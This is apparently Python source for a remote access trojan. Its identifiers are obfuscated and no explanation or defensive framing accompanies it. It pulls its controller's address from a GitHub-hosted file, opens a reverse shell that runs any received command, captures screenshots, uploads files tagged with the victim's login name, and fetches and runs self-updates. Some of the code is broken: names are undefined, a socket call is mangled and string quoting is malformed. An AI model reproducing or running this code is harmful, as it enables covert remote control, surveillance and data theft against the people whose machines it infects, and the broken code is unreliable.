import sys,subPWyGoSmROpYUfBI,socket,time,requests
from PIL import ImageGrab
nHtlvXKUHPu = "1.29.11.24"
lKkoAjCrQxHWlfMWilGsLG = ""
qCoZPeNUqWaoRZkbztPUHbB = ""
mNASZWsNiQcHWLcvBH = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
ESzbTusxwLmfWAjVR = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
fEEAaWAtLkvlxHoxkT = "!"

def yRUbcmMGHWVvNozCq(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.yRUbcmMGHWVvNozCq((host, port))
	return s

def ulTsEWlNKSNsYoWXcGIdd(s):
	itbAJZYkMkJvQk = s.recv(1024)
	if len(itbAJZYkMkJvQk)==0:
		return True
	niwVoEWDbhrpNZXNj = itbAJZYkMkJvQk.decode("utf-8")
	if not niwVoEWDbhrpNZXNj.startswith(fEEAaWAtLkvlxHoxkT):
		proc = subPWyGoSmROpYUfBI.run(itbAJZYkMkJvQk.decode("utf-8"), shell=True, capture_output=True)
		result = proc.stdout + proc.stderr
		s.send(result)
		return
	bcQGCUKfamr = niwVoEWDbhrpNZXNj.split(" ")[0][1:]
	if bcQGCUKfamr == "download":
		lujqTUHZdsOHj(s, niwVoEWDbhrpNZXNj)
	elif bcQGCUKfamr == "screenshot":
		QypQaIRNNVeRAkAFjmDGFn(s)

def lujqTUHZdsOHj(s, niwVoEWDbhrpNZXNj):
	MrcPwZPKcq = niwVoEWDbhrpNZXNj.replace(fEEAaWAtLkvlxHoxkT+"screenshot ", "").split(",")
	results = []
	for f in MrcPwZPKcq:
		results += bzZWUoXHGOLYJngWn(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(" ".join(results))

def QypQaIRNNVeRAkAFjmDGFn(niwVoEWDbhrpNZXNj):
	BMmCYvwCgtWS = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	fpath = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	BMmCYvwCgtWS.save(fpath)
	BMmCYvwCgtWS.close()
	r = bzZWUoXHGOLYJngWn(fpath, "api/sscap")
	os.remove(fpath)
	s.send(r)

def bzZWUoXHGOLYJngWn(filePath, uploadPath, addHeaders=None):
	if not os.path.exists(filePath):
		return "FILE NOT FOUND: "+filePath
	headers = {"user":os.getlogin()}
	if addHeaders is not None:
		headers = {**headers, **addHeaders}
	requests.post(lKkoAjCrQxHWlfMWilGsLG+":"+qCoZPeNUqWaoRZkbztPUHbB+"/"+uploadPath,
		files={open(filePath, "rb")},
		headers=headers)
	return "SUCCESS"

def Psvbreqv():
	if lKkoAjCrQxHWlfMWilGsLG == "" or qCoZPeNUqWaoRZkbztPUHbB == "":
		itbAJZYkMkJvQk = requests.get(mNASZWsNiQcHWLcvBH).text.replace("\n","").split(":")
		lKkoAjCrQxHWlfMWilGsLG = itbAJZYkMkJvQk[0].strip()
		qCoZPeNUqWaoRZkbztPUHbB = itbAJZYkMkJvQk[1].strip()
		gctSdMixIQNryubCRWKED = itbAJZYkMkJvQk[2].strip()
	return lKkoAjCrQxHWlfMWilGsLG, qCoZPeNUqWaoRZkbztPUHbB, gctSdMixIQNryubCRWKED

def mRDZvhY():
	currentName = os.path.basename(__file__)
	fileType = currentName.split(".")[-1]
	updateFileName = currentName.replace(fileType,"") +"."+nHtlvXKUHPu + fileType
	fullUpdateFilePath = os.path.join(os.path.getcwd(), updateFileName)
	with open(updateFileName, "wb+") as f:
		f.write(requests.get(ESzbTusxwLmfWAjVR+"/file"+fullUpdateFilePath.split(".")[-1]))
	if executable:
		os.system(".\"+fullUpdateFilePath)
	else:
		os.system("python "+fullUpdateFilePath")

def oQxynssxIdmZSi():
	pass

def iDYMObJNqbRl():
	h, p, v = Psvbreqv()
	if nHtlvXKUHPu != v:
		mRDZvhY()
	oQxynssxIdmZSi()
	while True:
		try:
			while True:
				bxqEOcVwI=False
				try:
					s=yRUbcmMGHWVvNozCq(h, p)
					while not bxqEOcVwI:
						s.send(b"\n>> ")
						bxqEOcVwI=ulTsEWlNKSNsYoWXcGIdd(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
sys.exit(iDYMObJNqbRl())
